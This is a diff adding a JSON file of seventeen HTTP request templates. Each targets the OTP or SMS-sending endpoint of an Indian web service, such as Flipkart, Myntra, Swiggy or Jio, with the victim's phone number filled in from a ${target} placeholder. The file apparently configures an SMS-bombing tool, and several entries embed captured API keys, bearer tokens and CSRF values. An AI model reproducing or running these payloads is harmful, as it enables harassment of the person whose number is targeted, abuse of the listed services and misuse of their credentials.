@@ -1,0 +1,205 @@
+{
+    "0": {
+        "url": "https://2.rome.api.flipkart.com/api/7/user/otp/generate",
+        "method": "POST",
+        "headers": {
+            "X-User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0 FKUA/website/42/website/Desktop"
+        },
+        "data": {
+            "loginId": "+91${target}"
+        }
+    },
+    "1": {
+        "url": "https://www.netmeds.com/mst/rest/v1/id/details/${target}",
+        "method": "GET",
+        "headers": {},
+        "data": ""
+    },
+    "2": {
+        "url": "https://blinkit.com/v2/accounts/",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
+            "Accept-Encoding": "gzip, deflate, br, zstd",
+            "auth_key": "c761ec3633c22afad934fb17a66385c1c06c5472b4898b866b7306186d0bb477"
+        },
+        "data": "user_phone=${target}"
+    },
+    "3": {
+        "url": "https://www.myntra.com/gateway/v1/auth/getotp",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
+            "Origin": "https://www.myntra.com",
+            "Connection": "keep-alive"
+        },
+        "data": {
+            "phoneNumber": "${target}",
+            "signup": "ONECLICK"
+        }
+    },
+    "4": {
+        "url": "https://www.meesho.com/api/v1/user/login/request-otp",
+        "method": "POST",
+        "headers": {},
+        "data": {
+            "phone_number": "${target}"
+        }
+    },
+    "5": {
+        "url": "https://api.account.relianceretail.com/service/application/retail-auth/v1.0/send-otp",
+        "method": "POST",
+        "headers": {
+            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXR1cm5fdWlfdXJsIjoid3d3Lmppb21hcnQuY29tL2N1c3RvbWVyL2FjY291bnQvbG9naW4_bXNpdGU9eWVzIiwiaWF0IjoxNzI0MTMzMDIyLCJleHAiOjE3MjQxMzMzMjIsInNhbHQiOjB9.m3-umON2qXV5lMQ1UZ_Mpq5kAYf3ecO7ZLvJQkA0G_A"
+        },
+        "data": {
+            "client_id": "fdb646ea-e708-4725-a953-228fa1cb8355",
+            "mobile": "${target}",
+            "device_info": "peOM9J9jfrtTqYeq96434OnoQ2iSwpw73MImaBYlT+KbCDCF0tRrhr/Hg+px6EKI1ajE3CMuAvx1iegwkPDNkY/NTqdpqGvuf+PVIxL2/vHO1j8CnO7xIDK9V4LAbAZpIzpSVun8LC4MWUV7pMLauy5RWvTI8AXAel6h6HZu0YYIqy3tcNXqB5SIHTJIJRDDZwVIAe3B/n/P4aOZ4MznE+0Yr9V+pNCtqdvAuSs/Ns6eukzMq8UiDoELcjfYm4x9VlyHHkgMrYcSHfNcvMYnsZfYPcnZrDpCEf9ddf84HBPGkfX8NQoM+BRhF5k4rp4wHn3N4sAHArnbRJRwxddXoQ=="
+        }
+    },
+    "6": {
+        "url": "https://pvt-product.cars24.com/pp/auth/mobile/otp/send/",
+        "method": "POST",
+        "headers": {
+            "x-api-key": "qGuMZcWGxZpgd8uSH4rgkal4v1evAlCd",
+            "phone_number": "${target}"
+        },
+        "data": ""
+    },
+    "7": {
+        "url": "https://www.swiggy.com/dapi/auth/sms-otp",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0"
+        },
+        "data": {
+            "mobile": "${target}",
+            "_csrf": "Q3XFUWEifNzG-TiLhlyj0KmbvqwOTWGAgPAcG6Rs"
+        }
+    },
+    "8": {
+        "url": "https://www.olx.in/api/auth/authenticate?lang=en-IN",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
+            "Accept": "*/*"
+        },
+        "data": {
+            "grantType": "phone",
+            "phone": "+91${target}",
+            "language": "en-IN"
+        }
+    },
+    "9": {
+        "url": "https://www.winzogames.com/sendSms",
+        "method": "POST",
+        "headers": {},
+        "data": {
+            "templateType": "WEBSITE_SMS_REQUEST",
+            "countryCode": "91",
+            "phoneNumber": "${target}"
+        }
+    },
+    "10": {
+        "url": "https://api.dream11.com/sendsmslink",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
+            "Content-type": "application/x-www-form-urlencoded"
+        },
+        "data": "siteId=1&mobileNum=${target}&appType=androidfull&abtest=2&ran=1.58"
+    },
+    "11": {
+        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
+        "method": "POST",
+        "headers": {},
+        "data": {
+            "mobile": "${target}",
+            "deviceId": "14b96299-88f6-4e16-a052-b281d6be0aee",
+            "deviceName": "",
+            "refCode": "",
+            "isPlaycircle": false
+        }
+    },
+    "12": {
+        "url": "https://auth.rooter.io/auth/otp",
+        "method": "POST",
+        "headers": {
+            "device-type": "web",
+            "app-version": "1.0.5",
+            "device-id": "ca1d26f0-6154-11ef-b6c1-af61b646f12b",
+            "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIwMDU0NjY3NjksInNJZCI6IjM2MDU0ZDM4LWI0MjUtNDZhZC05YmExLTBmNzg4NTk2MDcyOCIsInJvbGVzIjpbXSwiZGV2aWNlIjoid2ViIiwic2ZDcmVhdGVkQXQiOjE3MjQ0MjAyMjYsImlzVmVyaWZpZWQiOmZhbHNlLCJ1c2VyUm9sZXMiOnt9LCJpYXQiOjE3MjQ0MjAyMjYsImV4cCI6MTcyODMwODIyNn0.MxdBWjtyMlqy4mp78rQf1PWEjnxb9tSB586CN0kjUqc"
+        },
+        "data": {
+            "countryCode": "IN",
+            "mobile": "+91${target}",
+            "smsToken": "asdg1234567"
+        }
+    },
+    "13": {
+        "url": "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber=${target}&newOtp=true&retry=false&testparamsp=true",
+        "method": "GET",
+        "headers": {},
+        "data": ""
+    },
+    "14": {
+        "url": "https://apigate.abfrl.in/otp",
+        "method": "POST",
+        "headers": {
+            "devicetype": "desktop"
+        },
+        "data": {
+            "brand": "as",
+            "customerId": 0,
+            "cartId": 0,
+            "fcmToken": "111",
+            "version": "1.2",
+            "validateHash": false,
+            "geoLocation": {
+                "latitude": 343,
+                "longitude": 343
+            },
+            "latitude": "",
+            "longitude": "",
+            "deviceid": "5d653a2-cb6b-45e-b551-b12ca27fe42",
+            "devicetoken": "cdab4ed1360b457c035e5463e5fc72c5.1724421697",
+            "hash": "2cdcdb6d6bb302ac8d17fde68a9fa5d3.63d292c954c368a09cb59157ad2c80ab",
+            "sessionId": "cdab4ed1360b457c035e5463e5fc72c5",
+            "utmSource": "",
+            "mobile": "${target}",
+            "supportonlynewerversion": 1,
+            "shopId": 35,
+            "brandShopIds": "2",
+            "mode": "register",
+            "currentDomain": "allensolly",
+            "deviceId": "5d653a2-cb6b-45e-b551-b12ca27fe42",
+            "deviceToken": "cdab4ed1360b457c035e5463e5fc72c5.1724421697"
+        }
+    },
+    "15": {
+        "url": "https://unacademy.com/api/v3/user/user_check/?enable-email=true",
+        "method": "POST",
+        "headers": {},
+        "data": {
+            "phone": "${target}",
+            "country_code": "IN",
+            "otp_type": 1,
+            "email": "",
+            "send_otp": true,
+            "is_un_teach_user": false
+        }
+    },
+    "16": {
+        "url": "https://www.jio.com/api/jio-login-service/login/sendOtp",
+        "method": "POST",
+        "headers": {
+            "Accept": "*/*",
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0"
+        },
+        "data": {
+            "loginFlowType": "Mobile",
+            "mobileNumber": "${target}"
+        }
+    }
+}
